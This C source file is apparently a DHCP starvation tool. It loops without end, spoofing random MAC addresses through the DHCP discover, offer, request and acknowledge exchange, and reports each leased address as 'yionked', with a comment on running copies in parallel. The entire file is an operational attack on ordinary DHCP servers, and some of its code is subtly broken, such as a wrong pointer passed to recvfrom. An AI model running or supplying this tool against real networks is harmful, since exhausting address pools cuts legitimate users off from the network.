//# https://www.rfc-editor.org/rfc/rfc2131
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <time.h>
#include <poll.h>

/// The max time to wait for an offer in sec 
#define OFFER_TIMEOUT 2


//& DHCP messages from a client to a server are sent to the 'DHCP server' port (67),
//  and DHCP messages from a server to a client are sent to the 'DHCP client' port (68).
#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68

#define DHCP_BOOTREQUEST 1
//& 3.1 Client-server interaction
enum dhcp_msg_type {
  //& Client broadcast to locate available servers.
  DHCPDISCOVER = 1,
  //& Server to client in response to DHCPDISCOVER with offer of configuration parameters.
  DHCPOFFER    = 2,
  //& Client message to servers either (a) requesting offered parameters from one server
  //  and implicitly declining offers from all others...
  DHCPREQUEST  = 3
};

//& 2. Protocol Summary
struct dhcp_packet {
    u_int8_t op;
    u_int8_t htype;
    u_int8_t hlen;
    u_int8_t hops;
    u_int32_t xid;
    u_int16_t secs;
    u_int16_t flags;
    struct in_addr ciaddr;
    struct in_addr yiaddr;
    struct in_addr siaddr;
    struct in_addr giaddr;
    uint8_t chaddr[16];
    uint8_t sname[64];
    uint8_t file[128];
    //@ Don't need more than this for this scenario
    uint8_t options[32];
};

int create_socket(const char* if_name,
                  const size_t if_name_len)
{
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(DHCP_CLIENT_PORT),
        .sin_addr = htonl(INADDR_ANY),
    };

    //& DHCP uses UDP as its transport protocol
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Failed to create socket descriptor\n");
        return -1;
    }

    const int flag = 1;
    // so we can make a socket if the address and port is in use
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag)) < 0) {
        perror("Failed to set reuse address socket option\n");
        goto err;
    }

    // set the option for DHCP broadcast
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &flag, sizeof flag) < 0) {
        perror("Failed to set broadcast socket option\n");
        goto err;
    }

    // Bind the socket to the interface
    struct ifreq interface;
    strncpy(interface.ifr_ifrn.ifrn_name, if_name, if_name_len + 1);
    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, (char *)&interface, sizeof(interface)) < 0) {
        perror("Failed to bind socket to interface\n");
        goto err;
    }

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("Failed to bind socket to address\n");
        goto err;
    }

    return sock;
err:
    close(sock);
    return -2;
}

///
// @returns 0 on success
// @packet[out]
// @source[out]
int8_t wait_for_dhcp_respone(int sock,
                             struct dhcp_packet *packet,
                             struct sockaddr_in *source)
{
    struct pollfd pfd = {
        .fd = sock,
        .events = POLLIN
    };

    if (!poll(&pfd, 1, OFFER_TIMEOUT * 1000)) {
        return -1;   
    }
 
    
    socklen_t addrlen = sizeof(struct sockaddr_in);

    if(recvfrom(sock, packet, sizeof(struct dhcp_packet), 0, (struct sockaddr*)&source, &addrlen) < 0) {
        return -2;
    }

    return 0;
}

//@ Binary representation of a mac is 6 bytes
void gen_rand_mac(uint8_t r_mac[6])
{
    *(uint32_t*)r_mac = random();
    *(uint16_t*)(r_mac + 4) = random();
}

uint32_t dhcp_discover(int sock, const uint8_t r_mac[6])
{    
    u_int32_t transaction_id = random();
    struct dhcp_packet discover = { 
        .op = DHCP_BOOTREQUEST, 
        .htype = 1,
        .hlen = 6,
        .hops = 0,
        .xid = htonl(transaction_id),
        .secs = 0x00,
        // broadcast flag
        //& Figure 2:  Format of the 'flags' field
        .flags = htons(1<<15),
    };

    //copy mac
    memcpy(discover.chaddr, r_mac, 6);

    // Magic cookie values
    discover.options[0]= 0x63;
    discover.options[1]= 0x82;
    discover.options[2]= 0x53;
    discover.options[3]= 0x63;
    // message type DHCPDISCOVER
    discover.options[4] = 0x35;
    discover.options[5] = 0x1;
    discover.options[6] = DHCPDISCOVER;
    // options end
    discover.options[7] = 0xFF;

    struct sockaddr_in broadcast_address = {
        .sin_family = AF_INET,
        .sin_port = htons(DHCP_SERVER_PORT),
        .sin_addr = htonl(INADDR_BROADCAST),
    };

    sendto(sock, &discover, sizeof(discover), 0,
           (struct sockaddr*)&broadcast_address,
           sizeof(broadcast_address));

    return transaction_id;
}

/// Gets the first offer
//  @server_ip[out]
//  @offer_ip[out] 
//  @returns 0 on success
int8_t dhcp_offer(int sock, u_int32_t transaction_id,
                 const uint8_t r_mac[6],
                 struct in_addr *server_ip,
                 struct in_addr *offer_ip)
{
    struct dhcp_packet offer = {0};
    struct sockaddr_in source = {0};

    int err;
    if((err = wait_for_dhcp_respone(sock, &offer, &source))) {
        return err;
    }
        
    if (ntohl(offer.xid) != transaction_id) {
        return -2;
    }

    memcpy(server_ip, &source.sin_addr, sizeof(in_addr_t));
    memcpy(offer_ip, &offer.yiaddr, sizeof(in_addr_t));
    
    return 0;    
}

void dhcp_request(int sock, u_int32_t transaction_id,
                  struct in_addr server_ip,
                  struct in_addr request_ip,
                  const uint8_t r_mac[6])
{
    struct dhcp_packet request = {
      .op = DHCP_BOOTREQUEST,
      // defaults for 10mb ethernet
      .htype = 1,
      .hlen = 6,
      //& Client sets to zero, optionally used by relay agents
      .hops = 0,
      .xid = htonl(transaction_id),
      //& seconds elapsed since client began address acquisition or renewal process.
      /// just ignore it
      .secs = 0x00,
      // broadcast flag
      .flags = htons(1<<15),
      .ciaddr = request_ip,
    };

    // mac
    memcpy(request.chaddr, r_mac, 6);

    // Magic cookie values
    request.options[0]= 0x63;
    request.options[1]= 0x82;
    request.options[2]= 0x53;
    request.options[3]= 0x63;

    // message type DHCPREQUEST
    request.options[4] = 0x35;
    request.options[5] = 0x1;
    request.options[6] = DHCPREQUEST;

    // request address
    request.options[7] = 50;
    request.options[8] = 4;
    memcpy(&request.options[9], &request_ip, sizeof(request_ip));
    // ..from server address 
    request.options[13] = 54;
    request.options[14] = 4;
    memcpy(&request.options[15], &server_ip, sizeof(server_ip));
    request.options[19] = 0xFF;

    const struct sockaddr_in broadcast_address = {
        .sin_family = AF_INET,
        .sin_port = htons(DHCP_SERVER_PORT),
        .sin_addr = htonl(INADDR_BROADCAST),
    };

    sendto(sock, &request, sizeof(request), 0,
           (struct sockaddr*)&broadcast_address,
           sizeof(broadcast_address));
}

void dhcp_ack(int sock, struct in_addr request_ip)
{
    struct dhcp_packet ack = {0};
    struct sockaddr_in source = {0};

    if(wait_for_dhcp_respone(sock, &ack, &source)) {
       return;
    }
    
    if(request_ip.s_addr == ack.ciaddr.s_addr)
    {
        fprintf(stdout, "%s yionked\n", inet_ntoa(request_ip));   
    }
}

int main(const int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <interface>\n", argv[0]);
        return -1;
    }

    // Randomize the seed, so we can run it in parallel
    srandom((unsigned)(time(NULL) ^ getpid()));

    char *if_name = argv[1];
    ssize_t if_name_len = strnlen(if_name, IFNAMSIZ);
    
    int sockfd = create_socket(if_name, if_name_len);
    if(sockfd < 0) {
        return sockfd;    
    }

    uint8_t r_mac[6];
    struct in_addr s_ip, o_ip;

    while (true) {
        gen_rand_mac(r_mac);
        //discover
        uint32_t transaction_id = dhcp_discover(sockfd, r_mac);
        //offer
        if(dhcp_offer(sockfd, transaction_id, r_mac, &s_ip, &o_ip)) {
            continue;
        }
        //request
        dhcp_request(sockfd, transaction_id, s_ip, o_ip, r_mac);
        //aknowledge
        dhcp_ack(sockfd, o_ip);
    }

    close(sockfd);
    return 0;
}
